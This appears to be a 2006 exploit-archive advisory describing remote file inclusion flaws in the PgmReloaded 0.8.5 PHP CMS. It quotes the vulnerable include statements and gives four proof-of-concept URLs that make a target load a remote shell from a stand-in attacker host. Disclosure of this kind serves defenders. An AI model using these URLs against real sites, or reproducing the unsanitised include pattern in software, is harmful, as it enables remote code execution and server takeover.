@@ -1,0 +1,43 @@
++-------------------------------------------------------------------------------------------
++ PgmReloaded <= 0.8.5 Multiple Remote File Include Vulnerabilities
++-------------------------------------------------------------------------------------------
++ Vendor ............: http://matteolucarelli.net/
++ Affected Software .: PgmReloaded <= 0.8.5
++ Download ..........: http://www.matteolucarelli.net/pgmreloaded/pgmreloaded-0.8.5.tgz
++ Description .......: "PgmReloaded is a simple CMS for e-commerce and generic web catalogs"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ PgmReloaded has several scripts which do not initialize variables before using them to
++ include files, assuming register_globals = on, we can initialize any one of the variables
++ in a query string and include a remote file of our choice. The index.php file is vulnerable
++ to remote file inclusion regardless of register_globals settings.
++
++ Vulnerable Code:
++ index.php, line(s) 06:
++ -> 06: if ($_GET["lang"]!="") include ($_GET["lang"] . ".php");
++ common.inc.php, line(s) 08-17:
++ -> 08: include ($CFG["libdir"] . "stdlib.inc.php");
++ -> 09: include ($CFG["libdir"] . "phplib/db_" . $CFG["dbms"] . ".inc.php");	// PHPLib...
++ -> 10: include ($CFG["libdir"] . "pgm_" . $CFG["dbms"] . ".inc.php");		// PGM extension...
++ -> 11: include ($CFG["libdir"] . $CFG["dbms"] . "_common.inc.php");
++ -> 12: include ($CFG["libdir"] . "pgm_common.inc.php");
++ -> 13: include ($CFG["libdir"] . "pgm_session.inc.php");
++ -> 14: include ($CFG["libdir"] . "pgm_users.inc.php");
++ -> 15: include ($CFG["libdir"] . "pgm_cart.inc.php");
++ -> 16: include ($CFG["libdir"] . "phplib/template.inc.php");
++ -> 17: include ($CFG["localedir"] . $CFG["base_lang"] . "/base_lang.inc.php");
++ form_header.php, line(s) 07-15:
++ -> 07: include ($CFG["localelangdir"] . "global-error.inc.php");
++ -> 15: include ($CFG["localelangdir"] . "global-common.inc.php");
++
++ Proof Of Concept:
++ http://[target]/[path]/index.php?lang=http://evilsite.com/shell.php?
++ http://[target]/[path]/common.inc.php?CFG[libdir]=http://evilsite.com/shell.php?
++ http://[target]/[path]/common.inc.php?CFG[localedir]=http://evilsite.com/shell.php?
++ http://[target]/[path]/form_header.php?errormsg=1&CFG[localelangdir]=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-21]
